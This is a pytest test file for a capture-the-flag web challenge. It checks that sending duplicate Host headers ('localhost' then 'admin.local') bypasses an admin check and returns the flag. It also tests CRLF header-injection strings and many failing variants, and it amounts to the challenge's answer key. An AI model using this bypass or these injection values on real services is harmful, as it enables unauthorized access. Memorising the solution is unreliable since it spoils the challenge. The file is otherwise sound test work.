import pytest
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from pathlib import Path

# Disable SSL warnings for self-signed certificates
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def _load_flag(challenge_name):
    """Load flag from the challenge's .env file"""
    env_path = Path(__file__).parent.parent / f"challenge-{challenge_name}" / ".env"
    with open(env_path) as f:
        for line in f:
            if line.startswith("FLAG="):
                return line.split("=", 1)[1].strip()
    raise ValueError(f"FLAG not found in {env_path}")

class TestChallengeX:
    """Tests for Challenge X: Host header bypass"""
    
    def test_index_endpoint(self, challenge_x_service):
        """Test that the index endpoint returns expected message"""
        response = requests.get(f"{challenge_x_service}/", verify=False)
        assert response.status_code == 200
        assert "The flag is at /admin" in response.text
        assert "debug stuff at /debug" in response.text
    
    def test_debug_endpoint(self, challenge_x_service):
        """Test that the debug endpoint shows request headers"""
        headers = {"User-Agent": "Test-Agent", "Custom-Header": "test-value"}
        response = requests.get(f"{challenge_x_service}/debug", headers=headers, verify=False)
        assert response.status_code == 200
        assert "User-Agent: Test-Agent" in response.text
        assert "Custom-Header: test-value" in response.text
    
    def test_admin_endpoint_without_bypass(self, challenge_x_service):
        """Test that admin endpoint denies access without proper Host header"""
        response = requests.get(f"{challenge_x_service}/admin", verify=False)
        assert response.status_code == 421  # SNI mismatch because Host is "localhost:8443" not "localhost"
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
    
    def test_admin_endpoint_with_wrong_hosts(self, challenge_x_service):
        """Test that admin endpoint denies access with wrong Host headers"""
        # localhost should return 403 (domain verification failed)
        headers = {"Host": "localhost"}
        response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
        assert response.status_code == 403, "localhost should return 403"
        assert "HTTP request domain verification failed. Expected: admin.local" in response.text
        
        # Other wrong hosts should return 421 (SNI mismatch)
        wrong_hosts = ["example.com", "admin.com", "local.admin", "127.0.0.1"]
        for host in wrong_hosts:
            headers = {"Host": host}
            response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
            assert response.status_code == 421, f"Should return 421 for host: {host}"
            assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
    
    def test_admin_endpoint_single_host_fails(self, challenge_x_service):
        """Test that single Host header fails even with admin.local"""
        headers = {"Host": "admin.local"}
        response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
    
    def test_admin_endpoint_case_sensitivity(self, challenge_x_service):
        """Test that duplicate headers work with case insensitive header names but case sensitive values"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Header name should be case insensitive - this should work
        headers = HTTPHeaderDict([('host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200
        assert _load_flag("x") in response.data.decode()
        
        # But value should be case sensitive - this should fail
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'Admin.Local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 403
        assert "HTTP request domain verification failed. Expected: admin.local" in response.data.decode()
    
    def test_admin_endpoint_with_whitespace(self, challenge_x_service):
        """Test behavior with internal whitespace in Host value"""
        # Test with internal whitespace (should fail with 421 - SNI mismatch)
        headers = {"Host": "admin .local"}
        response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
        
        headers = {"Host": "admin. local"}
        response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
    
    def test_admin_endpoint_with_port_in_host(self, challenge_x_service):
        """Test behavior with port numbers in Host header"""
        # Host header with port should fail with 421 (SNI mismatch)
        headers = {"Host": "admin.local:443"}
        response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
        
        headers = {"Host": "admin.local:80"}
        response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
    
    def test_admin_endpoint_subdomain_variations(self, challenge_x_service):
        """Test that subdomains and similar domains are rejected"""
        similar_hosts = [
            "www.admin.local",
            "sub.admin.local", 
            "admin.local.com",
            "admin.localhost",
            "padmin.local",
            "admin.localp"
        ]
        
        for host in similar_hosts:
            headers = {"Host": host}
            response = requests.get(f"{challenge_x_service}/admin", headers=headers, verify=False)
            assert response.status_code == 421, f"Should return 421 for host: {host}"
            assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
    
    def test_admin_endpoint_duplicate_host_headers(self, challenge_x_service):
        """Test the core vulnerability: duplicate Host headers"""
        # This is the main technique for Host header attacks
        # The challenge requires exactly 2 Host headers with the second being admin.local
        
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test successful bypass with two Host headers
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200
        assert _load_flag("x") in response.data.decode()
        
        # Test with wrong order (should fail with 421 - SNI mismatch)
        headers = HTTPHeaderDict([('Host', 'admin.local'), ('Host', 'localhost')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 421
        
        # Test with three headers (should fail with 400 - too many headers)
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local'), ('Host', 'example.com')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 400
    
    def test_challenge_solution_verification(self, challenge_x_service):
        """Verify the exact solution from SOLUTION.md works"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Solution requires two Host headers as per SOLUTION.md
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200
        assert _load_flag("x") in response.data.decode()
    
    def test_ssl_certificate_validation(self, challenge_x_service):
        """Test that the service is using HTTPS with self-signed certificate"""
        # This should fail with SSL verification enabled
        with pytest.raises(requests.exceptions.SSLError):
            requests.get(f"{challenge_x_service}/", verify=True)
        
        # But should work with verification disabled
        response = requests.get(f"{challenge_x_service}/", verify=False)
        assert response.status_code == 200
    
    def test_http_to_https_redirect(self):
        """Test if there's HTTP to HTTPS redirect (optional)"""
        try:
            # Try HTTP version (might not be available)
            response = requests.get("http://localhost:8080/", timeout=5, allow_redirects=False)
            if response.status_code in [301, 302, 307, 308]:
                # There's a redirect to HTTPS
                assert "https://" in response.headers.get("Location", "")
        except requests.exceptions.RequestException:
            # No HTTP service available, which is fine
            pass

    # === ADDITIONAL COMPREHENSIVE TEST CASES ===

    def test_admin_endpoint_different_http_methods(self, challenge_x_service):
        """Test admin endpoint with different HTTP methods"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test bypass works with different HTTP methods
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD']
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        
        for method in methods:
            response = http.request(method, f"{challenge_x_service}/admin", headers=headers)
            if method == 'HEAD':
                # HEAD requests don't return body but should have same status code
                assert response.status == 200, f"Method {method} should succeed with bypass"
            elif response.status == 200:
                # GET should work, others might work too depending on Flask routing
                assert _load_flag("x") in response.data.decode(), f"Method {method} should return flag"
            elif response.status == 405:
                # Method not allowed is acceptable for non-GET methods
                continue
            else:
                # Any other status should be documented
                assert False, f"Unexpected status {response.status} for method {method}"

    def test_host_header_parsing_edge_cases(self, challenge_x_service):
        """Test various edge cases in Host header parsing"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test with extra whitespace
        headers = HTTPHeaderDict([('Host', ' localhost '), ('Host', ' admin.local ')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200, "Whitespace should be stripped correctly"
        assert _load_flag("x") in response.data.decode()
        
        # Test with empty first host
        headers = HTTPHeaderDict([('Host', ''), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 421, "Empty first host should fail with SNI mismatch"
        
        # Test with mixed case in admin.local (should fail - case sensitive)
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'Admin.Local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 403, "Case sensitivity should be enforced"
        
        # Test with Unicode/international characters
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200

    def test_host_header_injection_attempts(self, challenge_x_service):
        """Test various Host header injection attempts"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test with newline injection attempts (should be sanitized by HTTP library)
        injection_attempts = [
            'localhost\\r\\nAdmin: true',
            'localhost\\nHost: admin.local',
            'localhost\\r\\n\\r\\nGET /admin',
        ]
        
        for attempt in injection_attempts:
            try:
                headers = HTTPHeaderDict([('Host', attempt), ('Host', 'admin.local')])
                response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
                # If the request succeeds, it should either work normally or fail auth
                assert response.status in [200, 403], f"Injection attempt should be handled safely: {attempt}"
            except Exception:
                # HTTP library rejecting malformed headers is acceptable
                pass

    def test_admin_endpoint_boundary_conditions(self, challenge_x_service):
        """Test boundary conditions for the admin endpoint"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test with exactly correct condition (first host must be 'localhost')
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200
        
        # Test with more than 2 hosts (should fail with 400)
        headers = HTTPHeaderDict([('Host', 'first'), ('Host', 'admin.local'), ('Host', 'third')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 400, "More than 2 hosts should return 400"
        
        # Test with exactly 1 host (should fail with 421 - SNI mismatch)
        headers = HTTPHeaderDict([('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 421, "Single host should fail with 421 even if admin.local"
        
        # Test with admin.local as first host (should fail with 421 - SNI mismatch)
        headers = HTTPHeaderDict([('Host', 'admin.local'), ('Host', 'localhost')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 421, "admin.local as first host should fail with 421"

    def test_debug_endpoint_comprehensive(self, challenge_x_service):
        """Comprehensive testing of debug endpoint"""
        # Test debug endpoint shows Host header manipulation
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        headers = HTTPHeaderDict([
            ('Host', 'localhost'),
            ('Host', 'admin.local'),
            ('User-Agent', 'TestAgent/1.0'),
            ('X-Custom-Header', 'test-value'),
            ('Authorization', 'Bearer test-token')
        ])
        
        response = http.request('GET', f"{challenge_x_service}/debug", headers=headers)
        assert response.status == 200
        response_text = response.data.decode()
        
        # Should show the combined Host header
        assert "Host: localhost, admin.local" in response_text or "Host: localhost,admin.local" in response_text
        assert "User-Agent: TestAgent/1.0" in response_text
        assert "X-Custom-Header: test-value" in response_text
        assert "Authorization: Bearer test-token" in response_text

    def test_host_header_with_special_characters(self, challenge_x_service):
        """Test Host headers with special characters and edge cases"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test that valid first host 'localhost' works
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200, "Should work with first host: localhost"
        assert _load_flag("x") in response.data.decode()
        
        # Test with various special characters in first host (should fail with 421 - SNI mismatch)
        special_hosts = [
            'local-host',
            'local_host',
            'local.host.com',
            '192.168.1.1',
            '[::1]',
            'localhost:8443'
        ]
        
        for first_host in special_hosts:
            headers = HTTPHeaderDict([('Host', first_host), ('Host', 'admin.local')])
            response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
            assert response.status == 421, f"Should return 421 for first host: {first_host}"

    def test_request_method_security(self, challenge_x_service):
        """Test security implications of different request methods"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test that bypass works consistently across methods that are allowed
        working_methods = []
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        
        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
            try:
                response = http.request(method, f"{challenge_x_service}/admin", headers=headers)
                if response.status == 200:
                    working_methods.append(method)
                elif response.status == 405:
                    # Method not allowed is fine
                    continue
                else:
                    # Document unexpected status codes
                    pass
            except Exception as e:
                # Some methods might cause exceptions
                pass
        
        # At least GET should work
        assert 'GET' in working_methods, "GET method should work with bypass"

    def test_concurrent_requests_behavior(self, challenge_x_service):
        """Test behavior under concurrent requests (basic concurrency test)"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        import threading
        import time
        
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE', maxsize=10)
        
        results = []
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        
        def make_request():
            try:
                response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
                results.append(response.status)
            except Exception as e:
                results.append(f"Error: {str(e)}")
        
        # Launch multiple concurrent requests
        threads = []
        for _ in range(5):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all requests to complete
        for thread in threads:
            thread.join(timeout=10)
        
        # All successful requests should return 200
        success_count = sum(1 for result in results if result == 200)
        assert success_count >= 3, f"Most concurrent requests should succeed, got results: {results}"

    def test_ssl_security_features(self, challenge_x_service):
        """Test SSL/TLS security features"""
        import urllib3
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test that HTTPS is enforced
        response = http.request('GET', f"{challenge_x_service}/")
        assert response.status == 200, "HTTPS should be working"
        
        # Test with SSL verification disabled (our setup)
        response = requests.get(f"{challenge_x_service}/", verify=False)
        assert response.status_code == 200
        
        # Test that connection info indicates HTTPS
        assert challenge_x_service.startswith('https://'), "Service should use HTTPS"

    def test_error_responses_consistency(self, challenge_x_service):
        """Test that error responses are consistent and don't leak information"""
        # Test various failing conditions and their appropriate error responses
        # No Host header should return 421 (automatic Host header "localhost:8443" != "localhost")
        response = requests.get(f"{challenge_x_service}/admin", headers={}, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
        assert _load_flag("x") not in response.text  # Flag should not be leaked
        
        # Single wrong host should return 421 (SNI mismatch)
        response = requests.get(f"{challenge_x_service}/admin", headers={"Host": "wrong.host"}, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
        assert _load_flag("x") not in response.text  # Flag should not be leaked
        
        # Single admin.local should return 421 (SNI mismatch)
        response = requests.get(f"{challenge_x_service}/admin", headers={"Host": "admin.local"}, verify=False)
        assert response.status_code == 421
        assert "Invalid hostname. Server name indication (SNI) mismatch." in response.text
        assert _load_flag("x") not in response.text  # Flag should not be leaked

    def test_security_bypass_variations(self, challenge_x_service):
        """Test various bypass technique variations"""
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        # Test that only 'localhost' works as first host
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        assert response.status == 200, "Should work with first host: 'localhost'"
        assert _load_flag("x") in response.data.decode()
        
        # Test that other first hosts fail with 421 (SNI mismatch)
        invalid_first_hosts = ['127.0.0.1', 'example.com', 'anything', '']
        
        for first_host in invalid_first_hosts:
            headers = HTTPHeaderDict([('Host', first_host), ('Host', 'admin.local')])
            response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
            assert response.status == 421, f"Should return 421 for first host: '{first_host}'"

    def test_nonexistent_endpoints(self, challenge_x_service):
        """Test behavior with non-existent endpoints"""
        # Test 404 handling
        response = requests.get(f"{challenge_x_service}/nonexistent", verify=False)
        assert response.status_code == 404
        
        # Test that Host header bypass doesn't affect 404s
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        response = http.request('GET', f"{challenge_x_service}/nonexistent", headers=headers)
        assert response.status == 404, "Host bypass should not affect 404 responses"

    def test_performance_and_resource_usage(self, challenge_x_service):
        """Basic performance and resource usage test"""
        import time
        
        # Test response time for normal request
        start_time = time.time()
        response = requests.get(f"{challenge_x_service}/", verify=False)
        response_time = time.time() - start_time
        
        assert response.status_code == 200
        assert response_time < 5.0, f"Response time should be reasonable, got {response_time}s"
        
        # Test response time for admin bypass
        import urllib3
        from urllib3._collections import HTTPHeaderDict
        urllib3.disable_warnings()
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        
        headers = HTTPHeaderDict([('Host', 'localhost'), ('Host', 'admin.local')])
        start_time = time.time()
        response = http.request('GET', f"{challenge_x_service}/admin", headers=headers)
        bypass_response_time = time.time() - start_time
        
        assert response.status == 200
        assert bypass_response_time < 5.0, f"Bypass response time should be reasonable, got {bypass_response_time}s"